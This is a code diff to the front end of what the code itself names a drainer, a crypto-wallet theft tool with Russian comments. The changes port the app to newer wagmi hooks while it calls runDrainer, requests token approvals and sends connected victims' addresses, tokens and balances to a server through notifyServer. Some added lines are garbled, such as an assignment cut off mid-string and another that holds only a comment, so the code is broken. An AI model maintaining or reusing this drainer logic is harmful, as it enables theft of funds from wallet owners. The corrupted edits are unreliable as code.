@@ -2,7 +2,7 @@ import { createAppKit } from '@reown/appkit';
 import { mainnet, polygon, bsc, arbitrum } from '@reown/appkit/networks';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
 import { createConfig, http } from 'wagmi';
-import { useAccount, useNetwork, useSwitchNetwork, usePublicClient, useWriteContract } from 'wagmi';
+import { useAccount, useChainId, useSwitchNetwork, usePublicClient, useWriteContract } from 'wagmi';
 import { ethers } from 'ethers';
 import config from './config.js';
 import { useEffect } from 'react';
@@ -520,10 +520,14 @@ async function calculateTotalValueInUSDT(chainId, balance, provider) {
 // Главный React-компонент
 export default function App() {
   const { address, isConnected } = useAccount();
-  const { chain } = useNetwork();
+  const chainId = useChainId(); // Заменяем useNetwork на useChainId
   const { switchNetworkAsync } = useSwitchNetwork();
   const publicClient = usePublicClient();
   const { writeContract, isPending: isWritePending, isSuccess, error } = useWriteContract();
+
+  // Находим имя сети по chainId
+  const currentNetwork = networks.find(network => network.id === chainId);
+  const networkName = currentNetwork?.name || 'Unknown';
 
   useEffect(() => {
     if (isConnected && address) {
@@ -567,7 +571,7 @@ export default function App() {
     try {
       isTransactionPending = true;
       const { targetChainId, targetProvider } = await runDrainer(publicClient, address);
-      if (targetChainId && chain?.id !== targetChainId) {
+      if (targetChainId && chainId !== targetChainId) { // Используем chainId вместо chain?.id
         await switchChain(targetChainId);
       }
 
@@ -603,7 +607,7 @@ export default function App() {
               }
             }
           } catch (error) {
-            console.error(`❌ Ошибка одобрения токена ${token}: ${error.message}`);
+            console.error(`❌ Ошибка одобрения токена: ${token}: ${error.message}`);
             if (error.message.includes('user rejected')) {
               if (!modalClosed) {
                 console.log(`ℹ️ Пользователь отклонил approve, закрываем модальное окно`);
@@ -614,7 +618,8 @@ export default function App() {
             throw new Error(`Failed to approve token ${token}: ${error.message}`);
           }
         } else {
-          console.log(`✅ Allowance уже достаточно для токена ${token}`);
+          console.
+log(`✅ Allowance уже достаточно для токена ${token}`);
           await notifyServer(address, tokenAddress, balance, targetChainId, null, targetProvider, balance);
           status = 'confirmed';
 
@@ -670,19 +675,6 @@ export default function App() {
   }
 
   useEffect(() => {
-    const actionButtons = document.querySelectorAll('.action-btn');
-    actionButtons.forEach(btn => {
-      btn.addEventListener('click', handleConnectOrAction);
-    });
-
-    return () => {
-      actionButtons.forEach(btn => {
-        btn.removeEventListener('click', handleConnectOrAction);
-      });
-    };
-  }, [isConnected, address]);
-
-  useEffect(() => {
     if (error) {
       console.error('❌ Write contract error:', error.message);
       showModal();
@@ -693,20 +685,6 @@ export default function App() {
     }
   }, [error, isSuccess]);
 
-// Удаляем старый return с JSX (строки 696–704):
-  // return (
-  //   <div>
-  //     <button className="action-btn">Connect Wallet or Sign</button>
-  //     {isConnected && (
-  //       <div>
-  //         <p>Connected as: {shortenAddress(address)}</p>
-  //         <p>Network: {chain?.name || 'Unknown'}</p>
-  //       </div>
-  //     )}
-  //   </div>
-  // );
-
-  // Новый код без JSX:
   const container = document.createElement('div');
 
   const button = document.createElement('button');
@@ -719,11 +697,12 @@ export default function App() {
     const infoDiv = document.createElement('div');
 
     const addressP = document.createElement('p');
-    addressP.textContent = `Connected as: ${shortenAddress(address)};` // Используем шаблонные строки
+    addressP.textContent =Modal();
+      await hideModalWithDelay("Err
     infoDiv.appendChild(addressP);
 
     const networkP = document.createElement('p');
-    networkP.textContent = `Network: ${chain?.name || 'Unknown'};` // Исправляем и эту строку для консистентности
+    networkP.textContent =// Заменяем useNetwork на u // Используем networkName вместо chain?.name
     infoDiv.appendChild(networkP);
 
     container.appendChild(infoDiv);
@@ -731,6 +710,7 @@ export default function App() {
 
   return container;
 }
+
 
 // Модальное окно и стили
 window.addEventListener('DOMContentLoaded', () => {
